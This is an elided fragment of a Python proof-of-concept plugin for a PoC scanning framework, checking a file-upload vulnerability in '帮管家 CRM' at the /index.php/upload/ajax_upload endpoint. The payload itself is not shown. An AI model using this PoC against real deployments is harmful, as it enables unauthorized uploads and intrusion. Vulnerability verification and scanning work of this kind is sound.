...
class bangguanjiaCRM_ajax_upload(POCBase):
    pocDesc = '''帮管家 CRM ajax_upload文件上传'''
    author = '炼金术师诸葛亮'
    createDate = '2024-1-31'
    name = '帮管家 CRM ajax_upload文件上传漏洞'
    #app="帮管客-CRM"
    ...
    def _verify(self):
        ...
        result = {}
        url = self.url+ '/index.php/upload/ajax_upload'
        headers = {
...
register_poc(bangguanjiaCRM_ajax_upload)
